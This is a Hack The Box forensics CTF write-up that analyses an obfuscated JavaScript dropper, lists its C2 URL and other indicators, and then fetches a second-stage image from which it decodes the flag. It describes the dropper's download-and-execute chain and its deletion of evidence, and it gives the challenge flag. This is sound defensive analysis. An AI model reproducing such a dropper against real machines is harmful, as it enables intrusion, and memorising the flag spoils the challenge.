# HTB Forensics — GettingCloser Writeup

## Challenge Info

| Field | Details |
|-------|---------|
| **Platform** | Hack The Box |
| **Category** | Forensics |
| **Challenge** | GettingCloser |
| **Flag** | `HTB{0n3_St3p_cl0s3r_t0_th3_cur3}` |

## Challenge Description

> Tasked with defending the antidote's research, a diverse group of students united against a relentless cyber onslaught. As codes clashed and defenses were tested, their collective effort stood as humanity's beacon, inching closer to safeguarding the research for the cure with every thwarted attack. A stealthy attack might have penetrated their defenses. Along with the Hackster's University students, analyze the provided file so you can detect this attack in the future.

---

## Files Provided

- `vaccine.js` — An obfuscated JavaScript file used as a malicious dropper

---

## Step 1 — Analyzing `vaccine.js`

The provided file is heavily obfuscated JavaScript designed to run under **Windows Script Host (WSH)**. After cleaning up the variable names mentally, the logic breaks down as follows:

### COM Objects Instantiated

```javascript
new ActiveXObject("MSXML2.XMLHTTP.6.0")       // HTTP requests
new ActiveXObject("Scripting.FileSystemObject") // File I/O
new ActiveXObject("WScript.Shell")              // Command execution
```

### Execution Flow

1. A random `.vbs` filename is generated via `GetTempName()` and placed under `C:\Windows\Temp`
2. An HTTP GET request is made to the C2 URL:
   ```
   GET http://infected.human.htb/d/BKtQR
   ```
3. If the server responds with HTTP 200, the response body is written to the temp `.vbs` file
4. The VBScript is executed silently via:
   ```
   wscript "C:\Windows\Temp\<random>.vbs"
   ```
5. After execution completes, the temp file is **deleted** to cover tracks

### Indicators of Compromise (IOCs)

| Type | Value |
|------|-------|
| C2 URL | `http://infected.human.htb/d/BKtQR` |
| Drop path | `C:\Windows\Temp\<random>.vbs` |
| Execution | `wscript.exe` |
| COM Objects | `MSXML2.XMLHTTP.6.0`, `Scripting.FileSystemObject`, `WScript.Shell` |

---

## Step 2 — Connecting to the Live Docker Instance

The hint instructs us to add the hostname to `/etc/hosts` pointing to the Docker IP:

```bash
echo "154.57.164.83 infected.human.htb" >> /etc/hosts
```

Fetching the C2 payload URL:

```bash
curl http://infected.human.htb:31635/d/BKtQR
```

The server responded with a second-stage URL:

```
http://infected.zombie.htb/WJveX71agmOQ6Gw_1698762642.jpg
```

---

## Step 3 — Retrieving the Second Stage Payload

Despite the `.jpg` extension, we downloaded and inspected the file:

```bash
curl -o payload.jpg "http://154.57.164.83:31635/WJveX71agmOQ6Gw_1698762642.jpg"
file payload.jpg
```

Output:
```
payload.jpg: PNG image data, 1920 x 1080, 8-bit/color RGB, non-interlaced
```

It is a **real PNG image** — a steganography technique used to hide data inside a seemingly legitimate file.

The filename contains a Unix timestamp: `1698762642` = **October 31, 2023**.

---

## Step 4 — Extracting the Hidden Flag

Running `strings` and grepping for the flag pattern:

```bash
strings payload.jpg | grep -i "flag"
```

This revealed a Base64-encoded string at the end of the image data:

```
EhUQnswbjNfU3QzcF9jbDBzM3JfdDBfdGgzX2N1cjN9Cg==<<BASE64_END>>
```

Stripping the marker and the leading junk bytes (`EhU`), the remaining Base64 decodes to:

```bash
echo "QnswbjNfU3QzcF9jbDBzM3JfdDBfdGgzX2N1cjN9Cg==" | base64 -d
```

Output:
```
{0n3_St3p_cl0s3r_t0_th3_cur3}
```

Prepending the `HTB` prefix gives the full flag:

```
HTB{0n3_St3p_cl0s3r_t0_th3_cur3}
```

---

## Attack Chain Summary

```
vaccine.js (JS Dropper)
    └─► HTTP GET http://infected.human.htb/d/BKtQR
            └─► Returns URL to PNG image
                    └─► payload.jpg (PNG with hidden Base64 data)
                            └─► Base64 decoded → FLAG
```

---

## Tools Used

| Tool | Purpose |
|------|---------|
| `cat` / manual review | Static analysis of `vaccine.js` |
| `curl` | Fetching C2 URLs |
| `file` | Identifying true file type |
| `xxd` | Hex inspection of PNG |
| `strings` + `grep` | Extracting hidden Base64 string |
| `base64 -d` | Decoding the flag |

---

## Key Takeaways

- **Obfuscation via long variable names** is a common evasion technique in JS malware — the logic itself was simple once stripped of noise
- **Multi-stage delivery**: the JS dropper fetches a VBScript, which fetches a "image" — each layer adds deniability
- **Steganography**: hiding payloads inside valid image files is a classic C2 technique to blend in with normal web traffic
- **Anti-forensics**: the dropper deletes the temp `.vbs` after execution to reduce artifacts on disk
